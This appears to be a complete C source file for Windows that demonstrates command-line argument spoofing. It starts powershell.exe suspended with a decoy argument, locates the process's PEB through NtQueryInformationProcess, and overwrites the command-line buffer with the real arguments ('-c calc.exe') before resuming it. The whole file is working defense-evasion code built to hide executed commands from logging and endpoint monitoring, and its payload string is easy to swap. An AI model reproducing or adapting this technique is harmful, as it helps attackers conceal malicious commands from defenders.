#include <Windows.h>
#include <stdio.h>
// used for NTSTATUS, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION, RTL_USER_PROCESS_PARAMETERS
#include <winternl.h>


// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)


/*
	sizeof(STARTUP_ARGUMENRS) > sizeof(REAL_EXECUTED_ARGUMENTS)
*/
#define STARTUP_ARGUMENRS			L"powershell.exe Totally Legit Argument"		
#define REAL_EXECUTED_ARGUMENTS		L"powershell.exe -c calc.exe"



typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
);


// Helper Function
// Read Data from remote process of handle `hProcess` from the address `pAddress` of size `dwBufferSize`
// output base address is saved in `ppReadBuffer` parameter 
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead	= NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
	
	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

// Helper Function
// Write Data to remote process of handle `hProcess` at the address `pAddressToWriteTo`
// `pBuffer` is the data to be written of size `dwBufferSize`
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten	= NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}


/*

parameter:
	- szStartupArgs; the fake argument (these look legit) - or - it is just the process name 
	- szRealArgs; the argument you want the process to actually run
	- dwProcessId & hProcess & hThread; output parameters - information on the created process
*/
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS						STATUS		= NULL;

	WCHAR							szProcess	[MAX_PATH];

	STARTUPINFOW					Si			= { 0 };
	PROCESS_INFORMATION				Pi			= { 0 };

	PROCESS_BASIC_INFORMATION		PBI			= { 0 };
	ULONG							uRetern		= NULL;

	PPEB							pPeb		= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms		= NULL;


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// getting the address of the `NtQueryInformationProcess` function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) 
		return FALSE;


	lstrcpyW(szProcess, szStartupArgs);

	wprintf(L"\t[i] Running : \"%s\" ... ", szProcess);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,			// creating the process suspended & with no window
		NULL,
		L"C:\\Windows\\System32\\",						// we can use GetEnvironmentVariableW to get this Programmatically
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	printf("\t[i] Target Process Created With Pid : %d \n", Pi.dwProcessId);

	// gettint the `PROCESS_BASIC_INFORMATION` structure of the remote process (that contains the peb address)
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// reading the `peb` structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// reading the `ProcessParameters` structure from the peb of the remote process
	// we read extra `0xFF` bytes to insure we have reached the CommandLine.Buffer pointer
	// `0xFF` is 255, this can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// writing the parameter we want to run
	wprintf(L"\t[i] Writing \"%s\" As The Process Argument At : 0x%p ... ", szRealArgs, pParms->CommandLine.Buffer);
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}
	printf("[+] DONE \n");


	// cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// resuming the process with new paramters
	ResumeThread(Pi.hThread);

	// saving output parameters
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	// checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}






int main() {

	HANDLE		hProcess		= NULL,
				hThread			= NULL;

	DWORD		dwProcessId		= NULL;



	wprintf(L"[i] Target Process  Will Be Created With [Startup Arguments] \"%s\" \n", STARTUP_ARGUMENRS);
	wprintf(L"[i] The Actual Arguments [Payload Argument] \"%s\" \n", REAL_EXECUTED_ARGUMENTS);


	if (!CreateArgSpoofedProcess(STARTUP_ARGUMENRS, REAL_EXECUTED_ARGUMENTS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	



	printf("\n[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}






































